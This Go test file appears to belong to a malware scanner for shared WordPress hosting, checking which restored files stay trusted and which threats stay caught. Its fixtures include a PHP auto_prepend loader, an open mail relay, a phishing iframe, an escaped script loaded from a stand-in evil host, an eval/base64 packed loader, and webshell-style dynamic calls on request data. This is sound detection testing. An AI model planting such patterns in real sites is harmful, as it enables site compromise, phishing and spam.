package scanner

import (
	"archive/zip"
	"bytes"
	"crypto/md5"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Every kind of file restored from quarantine after a fleet review is kept
// here, judged the way a scan of any server judges it (path and content),
// so a new or reinstalled server never quarantines them again and a later
// rule change cannot bring them back. Malware next to them must still be
// caught. Fixtures are minimal, inert shapes of the real files.
func TestFleetRestoredCategories(t *testing.T) {
	s := newScanner(t)
	cert := base64.StdEncoding.EncodeToString([]byte("-----BEGIN CERTIFICATE-----\n" +
		base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{0x30, 0x82, 0x04, 0xa4}, 60)) + "\n-----END CERTIFICATE-----\n"))
	clean := []struct{ name, path, content string }{
		{"builder kit thumbnail saved as a page", "/home/u/public_html/wp-content/uploads/master_addons/templates_kits/thumbnails/image-Media.png",
			"<!DOCTYPE html><html><head><title>Just a moment...</title></head><body><script>window.location.href='/cdn-cgi/challenge'</script></body></html>"},
		{"cPanel MultiPHP ini", "/home/u/public_html/php.ini", "; cPanel-generated php ini directives, do not edit\n[PHP]\nauto_append_file = \"\"\nauto_prepend_file = \"\"\nmemory_limit = 1024M\n"},
		{"SureMails hardening ini", "/home/u/public_html/wp-content/uploads/suremails/.user.ini", "; Prevent auto-prepend/append attacks\nauto_prepend_file =\nauto_append_file =\n"},
		{"registration mail", "/home/u/shop.example.com/account/register.php", `<?php require_once '../config/db.php'; $email = trim($_POST['email'] ?? ''); @mail($email, 'Welcome - Verify Your Email', $body, 'From: '.ADMIN_EMAIL); header('Location: /account/dashboard.php');`},
		{"shipping app sign-up mail", "/home/u/public_html/application/ajax/sign_up_ajax.php", `<?php require_once("../loader.php"); $email_template = cdp_getEmailTemplates(7); $subject = $email_template->subject; mail($_POST['email'], $subject, $message, $header);`},
		{"composer ca-bundle", "/home/u/public_html/vendor/composer/ca-bundle/src/CaBundle.php", `<?php namespace Composer\CaBundle; class CaBundle { public static function isOpensslParseSafe() { $cert = '` + cert + `'; $script = "openssl_x509_parse(base64_decode('%s'));"; return $script; } }`},
		{"Laravel compiled view", "/home/u/app.example.com/storage/framework/views/4a985be53df3e16180696f04e944b6bb.php",
			`<?php $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f = $component; ?><?php if (isset($__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f)): ?><?php $component = $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f; ?><?php endif; ?><?php /**PATH /home/u/app/resources/views/welcome.blade.php ENDPATH**/ ?>`},
		{"analog stats cache", "/home/u/tmp/analog/cache", "CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!\nT\t0\t0\t460\n/wp-login.php?x=<?php eval($_POST[1]);?>\t1\n"},
	}
	for _, c := range clean {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d != nil {
			t.Errorf("%s: quarantined again as %s", c.name, d.Signature)
		}
	}
	elf := []byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0x3e, 0}
	for _, p := range []string{
		"/home/u/public_html/wp-content/ewww/optipng", "/home/u/site.example.com/wp-content/ewww/cwebp",
		"/home/u/public_html/news/app/ThirdParty/webp-convert/vendor/rosell-dk/webp-convert/src/Convert/Converters/Binaries/cwebp-120-linux-x86-64",
		"/home/u/public_html/node_modules/.bin/esbuild",
	} {
		if d, _ := binaryCheck(p, elf); d != nil {
			t.Errorf("%s: quarantined again as %s", p, d.Signature)
		}
	}

	// What must stay caught next to them.
	bad := []struct{ name, path, content string }{
		{"loader in ini", "/home/u/public_html/.user.ini", "auto_prepend_file = \"/home/u/public_html/wp-content/uploads/.x.ico\"\n"},
		{"open relay in a site", "/home/u/shop.example.com/admins/flyer.php", `<?php require 'common/conn.php'; $to = trim($_POST['frndemail']); $subject = $_POST["emailSubject"]; $ok = mail($to, $subject, $Body, "From: x"); header("Location: Newsletter.php");`},
		{"mail tester", "/home/u/public_html/.389653248945710.php", `<?php goto a; a: $to = $_GET["to"]; @mail($to, "Sending emails 1", "Test"); echo "##SENT##"; unlink(basename(__FILE__));`},
		{"page hidden as an upload image", "/home/u/public_html/wp-content/uploads/2026/10/logo.png", "<html><body><iframe src='https://phish.example/login'></iframe></body></html>"},
	}
	for _, c := range bad {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d == nil {
			t.Errorf("%s: no longer caught", c.name)
		}
	}
	if d, _ := binaryCheck("/home/u/site.example.com/wp-content/plugins/wp-rocket/vendor/monolog/monolog/src/Monolog/Handler/SyslogUdp/16e2277f8b31_A", elf); d == nil {
		t.Error("program hidden in a plugin's vendor folder: no longer caught")
	}
}

// Old embed codes write a script tag with document.write(unescape(...))
// (Google Analytics' ga.js loader, lead and chat widgets): only the
// brackets are escaped and the address is readable. A script or hidden
// frame spelled out in escaped letters is still reported.
func TestFleetDocumentWriteUnescape(t *testing.T) {
	ga := `var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));`
	if v := AnalyzeScript("js", []byte(ga)); v != nil {
		t.Errorf("ga.js loader reported as %s", v.Signature)
	}
	hidden := `document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%22%3E%3C%2F%73%63%72%69%70%74%3E'));`
	if v := AnalyzeScript("js", []byte(hidden)); v == nil {
		t.Error("escaped script not reported")
	}
}

// A published plugin's zip (WP-CLI's download cache on s5: the same
// WooCommerce PayPal Payments 4.1.3 zip quarantined 911 times in ten
// accounts) is judged like the installed plugin: members matching the
// version's official checksums are not reported. A changed member, a zip
// that is not one plugin, or a plugin without checksums is still checked.
func TestFleetPluginZipOfficialMembers(t *testing.T) {
	packed := []byte("<?php $d='" + strings.Repeat("QUFB", 600) + "';eval(base64_decode($d));")
	if d := analyze(".php", packed); d == nil || d.Category != CatVirus {
		t.Fatalf("fixture: %+v", d)
	}
	main := []byte("<?php\n/**\n * Plugin Name: Pay Example\n * Version: 4.1.3\n */\n")
	mk := func(name string, files map[string][]byte) string {
		p := filepath.Join(t.TempDir(), name)
		f, _ := os.Create(p)
		w := zip.NewWriter(f)
		for n, c := range files {
			e, _ := w.Create(n)
			e.Write(c)
		}
		w.Close()
		f.Close()
		return p
	}
	official := md5.Sum(packed)
	var asked []string
	known := func(slug, version, rel string, sum [16]byte) bool {
		asked = append(asked, slug+"@"+version+":"+rel)
		return slug == "pay-example" && version == "4.1.3" && rel == "build/loader.php" && sum == official
	}
	plugin := map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed}
	z := mk("pay-example-4.1.3.zip", plugin)
	fi, _ := os.Stat(z)
	if d := scanZipKnown(z, fi.Size(), known); d != nil {
		t.Fatalf("official plugin zip reported: %s (asked %v)", d.Signature, asked)
	}
	// Without the checksums the same zip is reported.
	if d := scanZipKnown(z, fi.Size(), nil); d == nil {
		t.Fatal("zip not checked without checksums")
	}
	// A changed member.
	changed := append(append([]byte{}, packed...), ' ')
	z2 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": changed})
	fi, _ = os.Stat(z2)
	if d := scanZipKnown(z2, fi.Size(), known); d == nil {
		t.Fatal("changed member not reported")
	}
	// Not one plugin folder: a shell next to a copy of the official file.
	z3 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed, "x.php": changed})
	fi, _ = os.Stat(z3)
	if d := scanZipKnown(z3, fi.Size(), func(string, string, string, [16]byte) bool { return true }); d == nil {
		t.Fatal("mixed zip trusted")
	}
}

// A2 F6: files trusted by name, place and shape (Softaculous's login file,
// WordPress translation files) stay trusted, but not when they call
// something named at run time on request data, and never when their exact
// content is known malware. Fixtures call harmless functions (strtoupper):
// only the shape matters.
func TestFleetShapeTrustNeedsNoDynamicCall(t *testing.T) {
	s := newScanner(t)
	root := t.TempDir()
	os.WriteFile(filepath.Join(root, "wp-config.php"), []byte("<?php define('X', 1);"), 0o644)
	sapp := filepath.Join(root, "sapp-wp-signon.php")
	l10n := filepath.Join(root, "wp-content", "languages", "plugins", "demo-en_GB.l10n.php")
	os.MkdirAll(filepath.Dir(l10n), 0o755)
	l10nOK := "<?php\nreturn ['domain'=>'demo','messages'=>['Run (now)'=>'Run (now)','Save'=>'Save']];\n"
	for _, c := range []struct {
		path, content string
		trusted       bool
	}{
		{sapp, sappSignon, true},
		{sapp, sappSignon + "\n$cb = $_REQUEST['cb']; $cb('x');", false},
		{sapp, sappSignon + "\n$a = array($_REQUEST['cb']); $a[0]('x');", false},
		{sapp, sappSignon + "\n('str'.'toupper')(getenv('HTTP_X'));", false},
		{sapp, sappSignon + "\narray_map($_REQUEST['cb'], array('x'));", false},
	} {
		if got := trustedHostingTool(c.path, []byte(c.content)); got != c.trusted {
			t.Errorf("login file %q: trusted %v, want %v", c.content[len(c.content)-30:], got, c.trusted)
		}
	}
	for _, c := range []struct {
		content string
		trusted bool
	}{
		{l10nOK, true},
		{"<?php\nreturn ['domain'=>('str'.'toupper')(getenv('HTTP_X'))];\n", false},
		{"<?php\nreturn ['domain'=>array_map('str'.'toupper', ['x'])];\n", false},
		{"<?php\nreturn ['domain'=>$GLOBALS['cb']('x')];\n", false},
		{"<?php\nreturn ['domain'=>file_get_contents('php://input')];\n", false},
	} {
		if got := translationFile(l10n, []byte(c.content)); got != c.trusted {
			t.Errorf("translation %q: trusted %v, want %v", c.content, got, c.trusted)
		}
	}

	// Known-bad content under a trusted shape is still caught by its hash.
	os.WriteFile(sapp, []byte(sappSignon), 0o644)
	info, _ := os.Lstat(sapp)
	if d, err := s.CheckFile(sapp, info, s.Settings.Get().Scanner); d != nil || err == nil {
		t.Fatalf("login file not trusted: %v %v", d, err)
	}
	sum := sha256.Sum256([]byte(sappSignon))
	os.MkdirAll(filepath.Dir(HashDBPath()), 0o700)
	os.WriteFile(HashDBPath(), []byte(fmt.Sprintf("%d %s XG-TEST.KnownBad\n", len(sappSignon), hex.EncodeToString(sum[:]))), 0o600)
	ReloadHashDB()
	t.Cleanup(func() { os.Remove(HashDBPath()); ReloadHashDB() })
	if d, _ := s.CheckFile(sapp, info, s.Settings.Get().Scanner); d == nil || d.Signature != "XG-TEST.KnownBad" {
		t.Fatalf("known-bad hash skipped for a trusted shape: %v", d)
	}
}
